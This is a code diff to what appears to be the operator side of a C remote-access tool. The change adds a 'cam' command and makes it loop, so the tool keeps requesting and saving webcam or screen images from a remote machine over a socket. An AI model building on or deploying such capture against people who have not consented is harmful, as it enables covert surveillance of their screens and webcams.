@@ -61,31 +61,37 @@ int	main(int argc, char **argv)
 		buff[ret_read -1] = '\0';
 		send(sock, &buff_read, strlen(buff_read), 0);
 
-		if (!strcmp(buff_read, "screen\n"))
+		if (!strcmp(buff_read, "screen\n") || !strcmp(buff_read, "cam\n"))
 		{
-			memset(&buff, 0, BUFFSIZE);
-			recv(sock, &buff, 7, 0);
-			printf("buff = %s\n", buff);
-			memset(&buff, 0, BUFFSIZE);
-			recv(sock, &buff, 7, 0);
-			printf("buff = %s\n", buff);
-			int	r_size = atoi(buff);
-			int	fd = open("./image.png", O_CREAT | O_RDWR | O_TRUNC, 0666);
-			if (fd == -1)
+			for (;;)
 			{
-				perror("open");
-				exit (errno);
-			}
-			memset(&buff, 0, BUFFSIZE);
-			while (r_size > 0/*(ret_recv = recv(sock, &buff, BUFFSIZE, 0)) > 0*/)
-			{
-				ret_recv = recv(sock, &buff, BUFFSIZE, 0);
-				write(fd, &buff, ret_recv);
 				memset(&buff, 0, BUFFSIZE);
-				r_size -= ret_recv;
+				recv(sock, &buff, 6, 0);
+				printf("buff = %s\n", buff);
+				memset(&buff, 0, BUFFSIZE);
+				recv(sock, &buff, 6, 0);
+				printf("buff = %s\n", buff);
+				int	r_size = atoi(buff);
+				int	fd = open("./image.jpeg", O_CREAT | O_RDWR | O_TRUNC, 0666);
+				if (fd == -1)
+				{
+					perror("open");
+					exit (errno);
+				}
+				memset(&buff, 0, BUFFSIZE);
+				while (r_size > 0/*(ret_recv = recv(sock, &buff, BUFFSIZE, 0)) > 0*/)
+				{
+					ret_recv = recv(sock, &buff, BUFFSIZE, 0);
+					write(fd, &buff, ret_recv);
+					memset(&buff, 0, BUFFSIZE);
+					r_size -= ret_recv;
+				}
+				printf("Screenshot taken.\n");
+				close(fd);
+				sleep(1);
+				send(sock, "cam\n", 4, 0);
 			}
-			printf("Screenshot taken.\n");
-			return (0);
+			/*return (0);*/
 		}
 
 		memset(&buff, 0, BUFFSIZE);
